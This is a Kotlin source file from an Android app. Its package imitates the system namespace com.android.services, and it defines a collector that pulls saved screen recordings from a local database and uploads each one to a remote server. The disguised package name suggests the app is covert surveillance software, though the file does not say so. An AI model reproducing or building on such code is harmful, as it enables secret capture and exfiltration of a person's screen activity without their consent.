package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.ScreenRecording
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray

class ScreenRecordingCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource
) : LogsCollector {

    override fun uploadLogs() {
        localDatabaseSource.selectScreenRecordings { screenRecordings ->
            if (screenRecordings.isNotEmpty()) {
                try {
                    val gson = GsonBuilder().create()
                    val mScreenRecordingJSON = JSONArray(
                        gson.toJson(
                            screenRecordings,
                            object : TypeToken<List<ScreenRecording>>() {}.type
                        )
                    )
                    val fileUploader =
                        FileUploader(
                            context,
                            AppConstants.SCREEN_RECORDING_TYPE,
                            localDatabaseSource
                        )
                    for (i in 0 until mScreenRecordingJSON.length()) {
                        try {
                            fileUploader.uploadFile(mScreenRecordingJSON.getJSONObject(i))
                        } catch (e: Exception) {
                            logException(e.message!!, AppConstants.SCREEN_RECORDING_TYPE, e)
                        }
                    }
                } catch (e: Exception) {
                    logException(e.message!!, AppConstants.SCREEN_RECORDING_TYPE, e)
                }
            } else {
                logVerbose("No ScreenRecordings found", AppConstants.SCREEN_RECORDING_TYPE)
            }
        }
    }
}